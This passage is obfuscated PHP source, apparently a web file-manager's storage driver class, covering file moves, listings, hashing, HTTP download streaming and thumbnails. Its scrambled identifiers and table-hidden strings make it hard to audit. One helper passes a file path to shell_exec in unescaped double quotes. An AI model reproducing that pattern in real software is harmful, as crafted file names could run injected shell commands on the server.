IO::copy($‡ò£—¾–, $this->pathFather($‡ò£—¾–), REPEAT_RENAME_FOLDER, $çÉá¾ëä); if ($Íãòò„¤) { IO::remove($‡ò£—¾–); } } else { $Íãòò„¤ = IO::mkdir($ü‘›¡Ø®); if (!$Íãòò„¤) { return !1; } $¨´¢ğ¯… = IO::listPath($‡ò£—¾–, !0); $ÉèÊİÎÏ = array_merge($¨´¢ğ¯…[$êˆä›—á[86]], $¨´¢ğ¯…[$êˆä›—á[87]]); foreach ($ÉèÊİÎÏ as $šÚµëÅ¼) { IO::move($šÚµëÅ¼[$êˆä›—á[88]], $ü‘›¡Ø®, REPEAT_RENAME_FOLDER); } IO::remove($‡ò£—¾–); } return $Íãòò„¤ ? $ü‘›¡Ø® : !1; } public function tempFile($‡è•„ãÙ = '', $®À”©“Î = '') { if (!$‡è•„ãÙ) { $‡è•„ãÙ = rand_string(15); } $šÅº’Ò = TEMP_FILES . rand_string(15) . $_SERVER[¯µç›È¢][8]; @mkdir($šÅº’Ò, DEFAULT_PERRMISSIONS, !0); $¡¡áå— = $šÅº’Ò . $‡è•„ãÙ; @touch($¡¡áå—); if ($®À”©“Î) { file_put_contents($¡¡áå—, $®À”©“Î); } return $¡¡áå—; } public function tempFileRemve($ÏÔô‘±) { @unlink($ÏÔô‘±); @rmdir($this->pathFather($ÏÔô‘±)); } public function mkfile($ÛÁÀó‘š, $Äºº÷÷ = '', $í«÷Ò«Û = REPEAT_RENAME) { } public function mkdir($Î ˆ½¦é, $éğû•” = REPEAT_SKIP) { } public function delFile($¢™Òê½) { } public function delFolder($¥šÁŞÑ) { } public function copyFile($ŒÔšõ , $µŠôÙùõ) { } public function moveFile($â¬¬©, $Ìõ—Éé) { } public function remove($­ñŸøüº) { if ($this->isFile($­ñŸøüº)) { return $this->delFile($­ñŸøüº); } return $this->delFolder($­ñŸøüº); } public function rename($óâÜãª, $¡«Å™æ) { } public function exist($¿óÈ‡±å) { } public function findByHash($ı…‰ˆøÈ = '', $¾ÁÓ¶ùÎ = '') { return !1; } public function isFile($Î¢ß®¶²) { } public function isFolder($¾¬şõğ‹) { } public function size($ŸÆÔÊ) { } public function info($ÉŒÙ€®¾) { } public function infoSimple($¹—È û©) { return $this->info($¹—È û©); } public function infoAuth($•í¸¾²Ñ) { return $this->info($•í¸¾²Ñ); } public function infoFull($½ÉÚÜ ) { return $this->info($½ÉÚÜ ); } public function infoWithChildren($â‹Ñ’±Í) { $¾’îÀ· =& $_SERVER[¯µç›È¢]; static $‹Âñ¬åÚ = array(); if (isset($‹Âñ¬åÚ[$â‹Ñ’±Í])) { return $‹Âñ¬åÚ[$â‹Ñ’±Í]; } $›•á»ëª = $this->info($â‹Ñ’±Í); if ($›•á»ëª && $›•á»ëª[$¾’îÀ·[33]] == $¾’îÀ·[89]) { $†õ “™× = array($¾’îÀ·[90] => 0, $¾’îÀ·[91] => 0, $¾’îÀ·[92] => 0); $this->infoChildren($â‹Ñ’±Í, $†õ “™×); $›•á»ëª[$¾’îÀ·[90]] = $†õ “™×[$¾’îÀ·[90]]; $›•á»ëª[$¾’îÀ·[93]] = array($¾’îÀ·[94] => $†õ “™×[$¾’îÀ·[91]], $¾’îÀ·[95] => $†õ “™×[$¾’îÀ·[92]]); $‹Âñ¬åÚ[$â‹Ñ’±Í] = $›•á»ëª; } return $›•á»ëª; } public function listPath($ÀÒ¥Ø¡¥, $«¼¡õĞ™ = false) { } public function has($ë¨ÜåÌš, $œÒåºØ¢ = false, $±ãÇÊı£ = false) { } public function canRead($Â¨Íù”ä) { } public function canWrite($éëä‘ğá) { } public function getContent($Å¢‚®ŒÇ) { } public function setContent($¯–Áä¥, $õŒÚêş = '') { } protected function infoChildren($È·üÓı, &$Ö¨ñŒ“) { $İöĞÀÒÉ =& $_SERVER[¯µç›È¢]; check_abort_echo(); $µ´¬É–Î = $this->listPath($È·üÓı, !0); $µ´¬É–Î = array_merge($µ´¬É–Î[$İöĞÀÒÉ[87]], $µ´¬É–Î[$İöĞÀÒÉ[86]]); foreach ($µ´¬É–Î as $Ñ¼§¤ƒ) { if ($Ñ¼§¤ƒ[$İöĞÀÒÉ[33]] == $İöĞÀÒÉ[89]) { $Ö¨ñŒ“[$İöĞÀÒÉ[92]]++; $°¿½¶ = $this->getPathInner($Ñ¼§¤ƒ[$İöĞÀÒÉ[88]]); $this->infoChildren($°¿½¶, $Ö¨ñŒ“); } else { $Ö¨ñŒ“[$İöĞÀÒÉ[91]]++; $Ö¨ñŒ“[$İöĞÀÒÉ[90]] += $Ñ¼§¤ƒ[$İöĞÀÒÉ[90]]; } } } public function fileSubstr($Ë³ö×¯Ï, $¶öˆ§˜™, $ìöŠËÛŞ) { } public function listAll($ï¾Ğ‚°ü) { } public function listAllMake($¶è¾Åö×, &$¿¥æ¦¹¼) { $î¶ÑŒ³Ù =& $_SERVER[¯µç›È¢]; check_abort_echo(); $’Ô¥ƒ º = $this->listPath($¶è¾Åö×, !0); if (!$’Ô¥ƒ º) { return; } $åù±ü‰î = array_merge($’Ô¥ƒ º[$î¶ÑŒ³Ù[87]], $’Ô¥ƒ º[$î¶ÑŒ³Ù[86]]); foreach ($åù±ü‰î as $ú‡çÔ¡´) { $»‡â×ù = $ú‡çÔ¡´[$î¶ÑŒ³Ù[33]] == $î¶ÑŒ³Ù[89]; $‰ª£áĞ = array($î¶ÑŒ³Ù[88] => $ú‡çÔ¡´[$î¶ÑŒ³Ù[88]], $î¶ÑŒ³Ù[89] => $»‡â×ù); if (isset($ú‡çÔ¡´[$î¶ÑŒ³Ù[90]])) { $‰ª£áĞ[$î¶ÑŒ³Ù[90]] = $ú‡çÔ¡´[$î¶ÑŒ³Ù[90]]; } if (isset($ú‡çÔ¡´[$î¶ÑŒ³Ù[96]])) { $‰ª£áĞ[$î¶ÑŒ³Ù[96]] = $ú‡çÔ¡´[$î¶ÑŒ³Ù[96]]; } if (!$»‡â×ù) { $¿¥æ¦¹¼[] = $‰ª£áĞ; continue; } $¿¥æ¦¹¼[] = $‰ª£áĞ; $Ö”á´ú = $ú‡çÔ¡´[$î¶ÑŒ³Ù[88]]; $ıñÁ€á† = $this->pathDriver; if (substr($ú‡çÔ¡´[$î¶ÑŒ³Ù[88]], 0, strlen($ıñÁ€á†)) == $ıñÁ€á†) { $Ö”á´ú = substr($Ö”á´ú, strlen($ıñÁ€á†)); } $this->listAllMake($Ö”á´ú, $¿¥æ¦¹¼); } } public function listAllSimple($«‡®©‚Á) { $Ò÷é¡íè =& $_SERVER[¯µç›È¢]; $ãÊÖ±êÖ = array(); $¢º˜Ú‰Š = $this->listAll($«‡®©‚Á); $çŒ¥õğ = $this->getPathOuter($«‡®©‚Á); foreach ($¢º˜Ú‰Š as $ãÊÚŠÛÙ) { $ÉŞßş§¨ = $ãÊÚŠÛÙ[$Ò÷é¡íè[88]]; $èÒ¯ÑÂÖ = $ãÊÚŠÛÙ[$Ò÷é¡íè[88]]; if (isset($ãÊÚŠÛÙ[$Ò÷é¡íè[97]])) { $ÉŞßş§¨ = $ãÊÚŠÛÙ[$Ò÷é¡íè[97]][$Ò÷é¡íè[88]]; $ãÊÚŠÛÙ[$Ò÷é¡íè[90]] = $ãÊÚŠÛÙ[$Ò÷é¡íè[97]][$Ò÷é¡íè[90]]; $ãÊÚŠÛÙ[$Ò÷é¡íè[96]] = $ãÊÚŠÛÙ[$Ò÷é¡íè[97]][$Ò÷é¡íè[96]]; } else { $èÒ¯ÑÂÖ = substr($ãÊÚŠÛÙ[$Ò÷é¡íè[88]], strlen(get_path_father($çŒ¥õğ))); $èÒ¯ÑÂÖ = $Ò÷é¡íè[8] . ltrim($èÒ¯ÑÂÖ, $Ò÷é¡íè[8]); } $‰¢ñ˜¼û = array($Ò÷é¡íè[88] => $èÒ¯ÑÂÖ, $Ò÷é¡íè[89] => $ãÊÚŠÛÙ[$Ò÷é¡íè[89]]); if (isset($ãÊÚŠÛÙ[$Ò÷é¡íè[90]]) && !$ãÊÚŠÛÙ[$Ò÷é¡íè[89]]) { $‰¢ñ˜¼û[$Ò÷é¡íè[90]] = $ãÊÚŠÛÙ[$Ò÷é¡íè[90]]; } if (isset($ãÊÚŠÛÙ[$Ò÷é¡íè[96]])) { $‰¢ñ˜¼û[$Ò÷é¡íè[96]] = $ãÊÚŠÛÙ[$Ò÷é¡íè[96]]; } if (!$ãÊÚŠÛÙ[$Ò÷é¡íè[89]]) { $‰¢ñ˜¼û[$Ò÷é¡íè[98]] = $ÉŞßş§¨; } $ãÊÖ±êÖ[] = $‰¢ñ˜¼û; } return $ãÊÖ±êÖ; } public function upload($ÈÜ›ô¤«, $æ€™ÊÕ, $­›¸¨¹Á = false, $ş–ÆÔÒÔ = REPEAT_REPLACE) { } public function uploadFileByID($îŞØ«Æ, $€½ãÒã¸, $ˆ˜ş†) { } public function uploadFileByPath($ØÍ¡ŠÖ•, $¡ÆÒ½òÂ, $Íæ¹â×â = array()) { } public function isUploadServer() { $íÜïÈ— =& $_SERVER[¯µç›È¢]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $íÜïÈ—[99]) { return !0; } return $GLOBALS[$íÜïÈ—[6]][$íÜïÈ—[100]][$íÜïÈ—[101]]; } public function isFileOutServer() { $üìå›Ñ =& $_SERVER[¯µç›È¢]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $üìå›Ñ[99]) { return !0; } return $GLOBALS[$üìå›Ñ[6]][$üìå›Ñ[100]][$üìå›Ñ[102]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($úºø†ÇÄ) { $€º–Øêã =& $_SERVER[¯µç›È¢]; if (!$this->isCdnHost()) { return $úºø†ÇÄ; } return str_replace(trim(get_url_root($úºø†ÇÄ), $€º–Øêã[8]), trim($this->cdnHost, $€º–Øêã[8]), $úºø†ÇÄ); } public function uploadLink($µÊÔ¼õØ, $—¬üü­à = 0) { $¬î÷•”² =& $_SERVER[¯µç›È¢]; if ($this->isUploadServer()) { return; } $•ûÛ À¬ = $this->getType(); if (!in_array($•ûÛ À¬, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $°ÌÌÊÙ¥ = 1024 * 1024 * 10; $‡İ˜õŸâ = $—¬üü­à <= $°ÌÌÊÙ¥ ? $¬î÷•”²[103] : $¬î÷•”²[104]; $©¥—øß‡ = (!$—¬üü­à ? 1 : ceil($—¬üü­à / pow(1024, 3))) * 3600 * 4; $É¦„†è§ = $this->{$‡İ˜õŸâ}($µÊÔ¼õØ, $©¥—øß‡); if ($É¦„†è§) { $É¦„†è§[$¬î÷•”²[105]] = $µÊÔ¼õØ; $É¦„†è§[$¬î÷•”²[106]] = $•ûÛ À¬; } return $É¦„†è§; } public function uploadFormData($‰ÆÓ‹¡², $µÃŞåè° = 3600) { } public function multiUploadFormData($àé£àíš, $«Ò Â°ã = 3600) { } public function download($Ëñ…õø, $ŒÑò”™) { } public function ext($­Â¾‹Âµ) { $ØÑÆ«œú =& $_SERVER[¯µç›È¢]; if (strpos($­Â¾‹Âµ, $ØÑÆ«œú[8]) === -1) { $Äê¬‡·ã = $­Â¾‹Âµ; } else { $Äê¬‡·ã = $this->pathThis($­Â¾‹Âµ); } $ß¥Áûñ® = $ØÑÆ«œú[12]; if (strstr($Äê¬‡·ã, $ØÑÆ«œú[10])) { $ß¥Áûñ® = substr($Äê¬‡·ã, strrpos($Äê¬‡·ã, $ØÑÆ«œú[10]) + 1); $ß¥Áûñ® = strtolower($ß¥Áûñ®); } if (strlen($ß¥Áûñ®) > 3 && preg_match($ØÑÆ«œú[107], $ß¥Áûñ®, $†»ßŸàŞ)) { $ß¥Áûñ® = $ØÑÆ«œú[12]; } return $ß¥Áûñ®; } public function pathThis($¯Æ·ôÑ­) { $…ŸÇ–¿ó =& $_SERVER[¯µç›È¢]; $¯Æ·ôÑ­ = str_replace($…ŸÇ–¿ó[108], $…ŸÇ–¿ó[8], rtrim($¯Æ·ôÑ­, $…ŸÇ–¿ó[8])); $ÊåÒõ—á = strrpos($¯Æ·ôÑ­, $…ŸÇ–¿ó[8]); if ($ÊåÒõ—á === !1) { return $¯Æ·ôÑ­; } return substr($¯Æ·ôÑ­, $ÊåÒõ—á + 1); } public function pathFather($ëœš™) { $°›çƒÏ† =& $_SERVER[¯µç›È¢]; $ëœš™ = str_replace($°›çƒÏ†[108], $°›çƒÏ†[8], rtrim($ëœš™, $°›çƒÏ†[8])); $§š¸Ñº• = strrpos($ëœš™, $°›çƒÏ†[8]); if ($§š¸Ñº• === !1) { return $°›çƒÏ†[12]; } return substr($ëœš™, 0, $§š¸Ñº• + 1); } public function hashSimple($Òºœ…ó) { $›Óú„®‹ =& $_SERVER[¯µç›È¢]; if (!$Òºœ…ó) { return md5($›Óú„®‹[12]); } $æüÜåñá = $this->size($Òºœ…ó); $§ˆ§Ù¥ = 200; $ôÉ¼í‰ø = 50; if ($æüÜåñá <= $§ˆ§Ù¥ * $ôÉ¼í‰ø) { return $this->hashMd5($Òºœ…ó) . $æüÜåñá; } $ãÀ€¾®È = intval($æüÜåñá / $ôÉ¼í‰ø); $Éöšª‹Ò = $›Óú„®‹[12]; for ($œìÔÑà§ = 0; $œìÔÑà§ < $ôÉ¼í‰ø; $œìÔÑà§++) { $Éöšª‹Ò .= $this->fileSubstr($Òºœ…ó, $ãÀ€¾®È * $œìÔÑà§, $§ˆ§Ù¥); } $Éöšª‹Ò .= $this->fileSubstr($Òºœ…ó, $æüÜåñá - $§ˆ§Ù¥, $§ˆ§Ù¥); return md5($Éöšª‹Ò) . $æüÜåñá; } public static $md5Cache = array(); public function hashMd5($Â–Á³°) { if (!$Â–Á³°) { return md5($_SERVER[¯µç›È¢][12]); } $Â–Á³° = $this->iconvSystem($Â–Á³°); if (isset(self::$md5Cache[$Â–Á³°])) { return self::$md5Cache[$Â–Á³°]; } self::$md5Cache[$Â–Á³°] = $this->hashMd5Shell($Â–Á³°); if (!self::$md5Cache[$Â–Á³°]) { self::$md5Cache[$Â–Á³°] = @md5_file($Â–Á³°); } return self::$md5Cache[$Â–Á³°]; } private function hashMd5Shell($â¥¼ıè®) { $©‡¬÷¨” =& $_SERVER[¯µç›È¢]; if (!$â¥¼ıè®) { return md5($©‡¬÷¨”[12]); } if (!function_exists($©‡¬÷¨”[109])) { return !1; } $“êäÒŞÊ = array($©‡¬÷¨”[110], $©‡¬÷¨”[111]); $”ÂòÃ‡ê = Cache::get($©‡¬÷¨”[112]); if (!$”ÂòÃ‡ê) { $€“¬ãíå = BASIC_PATH . $©‡¬÷¨”[113]; $¬ Êä’ = md5_file($€“¬ãíå); $”ÂòÃ‡ê = $©‡¬÷¨”[114]; foreach ($“êäÒŞÊ as $…è££ÉŸ) { $Ğë…ñ€£ = shell_exec($…è££ÉŸ . "\40\x22{$€“¬ãíå}\42"); if ($Ğë…ñ€£ && substr(trim($Ğë…ñ€£), 0, 32) == $¬ Êä’) { $”ÂòÃ‡ê = $…è££ÉŸ; break; } } Cache::set($©‡¬÷¨”[112], $”ÂòÃ‡ê, 3600); } if ($”ÂòÃ‡ê == $©‡¬÷¨”[114]) { return !1; } $Ğë…ñ€£ = shell_exec($”ÂòÃ‡ê . "\40\x22{$â¥¼ıè®}\42"); $Ğë…ñ€£ = str_replace($©‡¬÷¨”[115], $©‡¬÷¨”[12], $Ğë…ñ€£); return substr($Ğë…ñ€£, 0, 32); } public function link($…Ÿø´±¢) { return $…Ÿø´±¢; } public function fileOut($ûá£–ˆÇ, $™Ëı»ğÅ = false, $ğ¾Ûú½¼ = false, $¤ÔµÒà = '') { $ØÆà² œ =& $_SERVER[¯µç›È¢]; $this->cacheMethod(null, null); if (!$ûá£–ˆÇ || !$this->exist($ûá£–ˆÇ)) { show_json(LNG($ØÆà² œ[116]), !1, $ğ¾Ûú½¼); } $ØÓÄÖıš = $this->getType() == $ØÆà² œ[117]; $ÑêüĞ¼¢ = $GLOBALS[$ØÆà² œ[6]][$ØÆà² œ[100]][$ØÆà² œ[118]][$ØÆà² œ[119]]; $à¶ñ×Õ‡ = (double) $GLOBALS[$ØÆà² œ[6]][$ØÆà² œ[100]][$ØÆà² œ[118]][$ØÆà² œ[120]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $‘†Ûæí = $this->infoFull($ûá£–ˆÇ); $Æ¦‹ë° = $‘†Ûæí[$ØÆà² œ[90]]; $·ÔĞÅ†¸ = gmdate($ØÆà² œ[121], $‘†Ûæí[$ØÆà² œ[96]]); $±°˜üÑû = $ğ¾Ûú½¼ ? $ğ¾Ûú½¼ : $this->iconvApp($‘†Ûæí[$ØÆà² œ[32]]); $¾áÖ‡› = 0; $Ş—ıÌÁ¹ = $Æ¦‹ë° - 1; $Ç€÷Ø¹¥ = $this->ext($±°˜üÑû); if (in_array($Ç€÷Ø¹¥, array($ØÆà² œ[122], $ØÆà² œ[123], $ØÆà² œ[124], $ØÆà² œ[125]))) { $Ç€÷Ø¹¥ = $ØÆà² œ[126]; } if (in_array($Ç€÷Ø¹¥, array($ØÆà² œ[127]))) { $Ç€÷Ø¹¥ = $ØÆà² œ[128]; } if (!$¤ÔµÒà) { $¤ÔµÒà = md5($·ÔĞÅ†¸ . $this->hashSimple($ûá£–ˆÇ)); } $¤ÔµÒà = $ØÆà² œ[129] . $¤ÔµÒà . $ØÆà² œ[129]; $ëÎ§’Ö = get_file_mime($Ç€÷Ø¹¥); $®âŒÒ›„ = !1; if (isset($_GET[$ØÆà² œ[130]])) { $®âŒÒ›„ = !0; } if ($™Ëı»ğÅ === !1 && !mime_support($ëÎ§’Ö)) { $ëÎ§’Ö = $ØÆà² œ[131]; } header($ØÆà² œ[132]); header($ØÆà² œ[133] . $ëÎ§’Ö); $Ï³¨Ø½è = rawurlencode($±°˜üÑû); $Ï³¨Ø½è = $ØÆà² œ[129] . $Ï³¨Ø½è . $ØÆà² œ[134] . $Ï³¨Ø½è; if ($™Ëı»ğÅ) { header($ØÆà² œ[135]); header($ØÆà² œ[136] . $Ï³¨Ø½è); } else { if ($®âŒÒ›„) { header($ØÆà² œ[137] . $Ï³¨Ø½è); } } header($ØÆà² œ[138] . gmdate($ØÆà² œ[121], time() + 3600 * 24 * 30) . $ØÆà² œ[139]); header($ØÆà² œ[140]); header($ØÆà² œ[141]); header($ØÆà² œ[142]); if (isset($_SERVER[$ØÆà² œ[143]]) && strtotime($_SERVER[$ØÆà² œ[143]]) == $‘†Ûæí[$ØÆà² œ[96]]) { header($ØÆà² œ[144], !0, 304); die; } if (isset($_SERVER[$ØÆà² œ[145]]) && $_SERVER[$ØÆà² œ[145]] == $¤ÔµÒà) { header($ØÆà² œ[146] . $¤ÔµÒà, !0, 304); die; } header($ØÆà² œ[146] . $¤ÔµÒà); header($ØÆà² œ[147] . $·ÔĞÅ†¸ . $ØÆà² œ[139]); header($ØÆà² œ[148] . $±°˜üÑû); header($ØÆà² œ[149]); header($ØÆà² œ[150] . $Æ¦‹ë°); header($ØÆà² œ[151]); if (!$™Ëı»ğÅ && $Ç€÷Ø¹¥ == $ØÆà² œ[152]) { if ($Æ¦‹ë° > 1024 * 1024 * 5) { die; } $çÆÅ³ = $this->getContent($ûá£–ˆÇ); $çÆÅ³ = Html::clearSVG($çÆÅ³); header($ØÆà² œ[153] . strlen($çÆÅ³)); echo $çÆÅ³; die; } $¼àËª¶° = strtolower($_SERVER[$ØÆà² œ[154]]); if ($ØÓÄÖıš && $¼àËª¶° && $ÑêüĞ¼¢) { if (strstr($¼àËª¶°, $ØÆà² œ[155])) { header($ØÆà² œ[156] . $ûá£–ˆÇ); } else { if (strstr($¼àËª¶°, $ØÆà² œ[157])) { header($ØÆà² œ[158] . $ûá£–ˆÇ); } else { if (strstr($¼àËª¶°, $ØÆà² œ[159])) { header($ØÆà² œ[160] . $ûá£–ˆÇ); } } } if ($à¶ñ×Õ‡) { header($ØÆà² œ[161] . $à¶ñ×Õ‡); } return; } if (isset($_SERVER[$ØÆà² œ[162]])) { if (preg_match($ØÆà² œ[163], $_SERVER[$ØÆà² œ[162]], $©¯İ¬²Œ)) { $¾áÖ‡› = intval($©¯İ¬²Œ[1]); if (!empty($©¯İ¬²Œ[2])) { $Ş—ıÌÁ¹ = intval($©¯İ¬²Œ[2]); } } header($ØÆà² œ[164]); header("\x43\157\156\164\x65\156\x74\55\122\x61\x6e\x67\145\x3a\x20\x62\171\x74\145\163\x20{$¾áÖ‡›}\x2d{$Ş—ıÌÁ¹}\x2f" . $Æ¦‹ë°); } else { header($ØÆà² œ[165]); } header($ØÆà² œ[166]); $©Š„Êû¶ = !0; if ($_SERVER[$ØÆà² œ[167]] == $ØÆà² œ[168] && $Æ¦‹ë° > 1204 * 1024 * 1024 * 2) { $©Š„Êû¶ = !1; } if ($©Š„Êû¶) { header($ØÆà² œ[169] . ($Ş—ıÌÁ¹ - $¾áÖ‡› + 1)); } if ($_SERVER[$ØÆà² œ[170]] == $ØÆà² œ[171]) { return; } $¿şğŞ¤ = 1024 * 100; $´†Æ¨ = 0; if ($à¶ñ×Õ‡) { $´†Æ¨ = intval(1000 * 1000 * ($¿şğŞ¤ / $à¶ñ×Õ‡)); } while ($¾áÖ‡› <= $Ş—ıÌÁ¹) { $ÌÆ«½’ö = timeFloat(); check_abort(); $‹ØŠò¤ = $Ş—ıÌÁ¹ - $¾áÖ‡› + 1; if ($‹ØŠò¤ <= $¿şğŞ¤) { $¿şğŞ¤ = $‹ØŠò¤; } echo $this->fileSubstr($ûá£–ˆÇ, $¾áÖ‡›, $¿şğŞ¤); $¾áÖ‡› += $¿şğŞ¤; if ($¿şğŞ¤ == $‹ØŠò¤) { $¾áÖ‡› = $Ş—ıÌÁ¹ + 1; } if ($´†Æ¨) { $óşàŸ»ú = intval(1000 * 1000 * (timeFloat() - $ÌÆ«½’ö)); $×‹İğ¥ = $´†Æ¨ - $óşàŸ»ú; if ($×‹İğ¥ > 5) { usleep($×‹İğ¥); } } } } public function fileOutServer($ç¾À°Íı, $ö¢§ñÃ· = false, $ğî¿ÃŸù = false, $œ£¼Øä¨ = '') { $this->fileOut($ç¾À°Íı, $ö¢§ñÃ·, $ğî¿ÃŸù, $œ£¼Øä¨); } public function fileOutLink($ŞĞ—¬‰‘) { header($_SERVER[¯µç›È¢][172] . $ŞĞ—¬‰‘); die; } public function cacheMethod($¶Ò§öí, $Ô•ª©, $ÔŠÀá”ğ = null) { $åâç‚„€ =& $_SERVER[¯µç›È¢]; static $±…Òåä± = array(); $¶›ûË£ò = $Ô•ª© ? ltrim($this->getPathOuter($Ô•ª©), $åâç‚„€[8]) : $Ô•ª©; $†©à©Æ = $åâç‚„€[173] . $¶Ò§öí . $åâç‚„€[174] . rtrim($¶›ûË£ò, $åâç‚„€[8]); if (is_null($¶Ò§öí)) { $±…Òåä± = array(); return; } if (is_null($Ô•ª©)) { unset($±…Òåä±[$†©à©Æ]); return; } if (!is_null($ÔŠÀá”ğ)) { $±…Òåä±[$†©à©Æ] = $ÔŠÀá”ğ; return; } $šğ–æ¾ = isset($±…Òåä±[$†©à©Æ]) ? $±…Òåä±[$†©à©Æ] : null; if (!is_null($šğ–æ¾)) { return $šğ–æ¾; } $šğ–æ¾ = $this->{$¶Ò§öí}($Ô•ª©); $±…Òåä±[$†©à©Æ] = $šğ–æ¾; return $šğ–æ¾; } public function fileOutImage($™ê€Øİğ, $Ñí„†Ö† = 250) { $–½ÊÕÚ² =& $_SERVER[¯µç›È¢]; set_timeout(); if (substr($™ê€Øİğ, 0, 4) == $–½ÊÕÚ²[159]) { $this->fileOutLink($™ê€Øİğ); } $Ÿ€êü = $this->info($™ê€Øİğ); $–¿ÜÙï = $Ÿ€êü[$–½ÊÕÚ²[32]]; $¼ĞĞ•ï = !1; if (isset($GLOBALS[$–½ÊÕÚ²[175]]) && $GLOBALS[$–½ÊÕÚ²[175]][$–½ÊÕÚ²[88]] == $Ÿ€êü[$–½ÊÕÚ²[88]]) { $Ù±—®Ûë = $GLOBALS[$–½ÊÕÚ²[175]][$–½ÊÕÚ²[176]]; if (!$Ÿ€êü[$–½ÊÕÚ²[177]]) { $Ÿ€êü[$–½ÊÕÚ²[177]] = $GLOBALS[$–½ÊÕÚ²[175]]; } if (isset($Ù±—®Ûë[$–½ÊÕÚ²[178]])) { if ($Ù±—®Ûë[$–½ÊÕÚ²[178]] <= $Ñí„†Ö† && $Ù±—®Ûë[$–½ÊÕÚ²[179]] <= $Ñí„†Ö†) { $¼ĞĞ•ï = !0; } } $–¿ÜÙï = $Ÿ€êü[$–½ÊÕÚ²[177]][$–½ÊÕÚ²[32]]; } if ($Ÿ€êü[$–½ÊÕÚ²[90]] <= 1024 * 50 || $¼ĞĞ•ï || !function_exists($–½ÊÕÚ²[180]) || $Ÿ€êü[$–½ÊÕÚ²[181]] == $–½ÊÕÚ²[182]) { return $this->fileOut($™ê€Øİğ, !1, $–¿ÜÙï); } if (isset($Ÿ€êü[$–½ÊÕÚ²[177]][$–½ÊÕÚ²[183]])) { $ş‚ãÉğÊ = $Ÿ€êü[$–½ÊÕÚ²[177]][$–½ÊÕÚ²[183]]; } else { if (isset($Ÿ€êü[$–½ÊÕÚ²[177]][$–½ÊÕÚ²[184]])) { $ş‚ãÉğÊ = $Ÿ€êü[$–½ÊÕÚ²[177]][$–½ÊÕÚ²[184]]; } else { $ş‚ãÉğÊ = md5("{$Ÿ€êü[$–½ÊÕÚ²[32]]}\137{$Ÿ€êü[$–½ÊÕÚ²[88]]}\x5f{$Ÿ€êü[$–½ÊÕÚ²[90]]}"); } } $“ºêïØ¢ = "{$ş‚ãÉğÊ}\137{$Ñí„†Ö†}\x2e\x70\x6e\147"; if (!($ûñ•éÎÅ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $–½ÊÕÚ²[185]))) { $”Üáœ÷¿ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $–½ÊÕÚ²[186]); } else { $”Üáœ÷¿ = KodIO::make($ûñ•éÎÅ); } if ($ûñ•éÎÅ = IO::fileNameExist($”Üáœ÷¿, $“ºêïØ¢)) { $·èæõ× = KodIO::make($ûñ•éÎÅ); return IO::fileOut($·èæõ×, !1, $–¿ÜÙï); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $·èæõ× = DATA_THUMB . $“ºêïØ¢; del_file($·èæõ×); if (!@file_exists($·èæõ×)) { $‚º›°¸× = TEMP_FILES; if (!is_dir($‚º›°¸×)) { mk_dir($‚º›°¸×); } $³õÕ›‚Ğ = $‚º›°¸× . $ş‚ãÉğÊ . $–½ÊÕÚ²[10] . $Ÿ€êü[$–½ÊÕÚ²[181]]; if (!@file_exists($³õÕ›‚Ğ)) { $³õÕ›‚Ğ = $this->download($™ê€Øİğ, $³õÕ›‚Ğ); } ImageThumb::createThumb($³õÕ›‚Ğ, $·èæõ×, $Ñí„†Ö†, $Ñí„†Ö† * 10); } if (!file_exists($·èæõ×) || filesize($·èæõ×) < 100) { return @file_exists($³õÕ›‚Ğ) ? IO::fileOut($³õÕ›‚Ğ) : $this->fileOut($™ê€Øİğ); } if (!($ÇÕÛöÊ = IO::move($·èæõ×, $”Üáœ÷¿))) { return IO::fileOut($·èæõ×); } del_file($·èæõ×); IO::fileOut($ÇÕÛöÊ); } public function fileOutImageServer($²®ôä–í, $Âíã²  = 250) { $this->fileOutImage($²®ôä–í, $Âíã² ); } public function fileNameAuto($ºã˜»²€, $Òº §§, $àş©ÜÉ = REPEAT_RENAME, $“®àÏ©Ç = false) { $¨ë¬ÙÇ =& $_SERVER[¯µç›È¢]; $ê¦·Ç°› = $ºã˜»²€ === $¨ë¬ÙÇ[12] ? $Òº §§ : rtrim($ºã˜»²€, $¨ë¬ÙÇ[8]) . $¨ë¬ÙÇ[8] . $Òº §§; if ($àş©ÜÉ == REPEAT_REPLACE || !$this->exist($ê¦·Ç°›) || $“®àÏ©Ç && $àş©ÜÉ != REPEAT_RENAME_FOLDER) { return $Òº §§; } if ($àş©ÜÉ == REPEAT_SKIP) { return !1; } $…’ÑÊÒ¸ = $¨ë¬ÙÇ[10] . get_path_ext($Òº §§); $…’ÑÊÒ¸ = $…’ÑÊÒ¸ == $¨ë¬ÙÇ[10] || $“®àÏ©Ç ? $¨ë¬ÙÇ[12] : $…’ÑÊÒ¸; $Ëßµ–´ = 1; $á±Ğ¡ş = substr($Òº §§, 0, strlen($Òº §§) - strlen($…’ÑÊÒ¸)); $Ê†â©·¡ = $á±Ğ¡ş . "\x28{$Ëßµ–´}\51{$…’ÑÊÒ¸}"; while ($this->exist(rtrim($ºã˜»²€, $¨ë¬ÙÇ[8]) . $¨ë¬ÙÇ[8] . $Ê†â©·¡)) { $Ê†â©·¡ = $á±Ğ¡ş . "\50{$Ëßµ–´}\51{$…’ÑÊÒ¸}"; $Ëßµ–´++; } return $Ê†â©·¡; } private function fileNameAutoList($ÇåÏŠÚá, $¬®™Ğ, $ŠËæñ°¢ = false) { $Ø¿À²§î =& $_SERVER[¯µç›È¢]; $‡ü¯„ = $this->listPath($ÇåÏŠÚá, !0); $‡ü¯„ = array_merge($‡ü¯„[$Ø¿À²§î[87]], $‡ü¯„[$Ø¿À²§î[86]]); $‹è±é¶ = array_to_keyvalue($‡ü¯„, $Ø¿À²§î[12], $Ø¿À²§î[32]); $”¾óĞùû = $Ø¿À²§î[10] . get_path_ext($¬®™Ğ); $”¾óĞùû = $”¾óĞùû == $Ø¿À²§î[10] || $ŠËæñ°¢ ? $Ø¿À²§î[12] : $”¾óĞùû; $Æ×ÅÖÁ = substr($¬®™Ğ, 0, strlen($¬®™Ğ) - strlen($”¾óĞùû)); $Ìš®êı = $Æ×ÅÖÁ . "\50\x30\x29{$”¾óĞùû}"; for ($á‘ÆˆòÙ = 1; 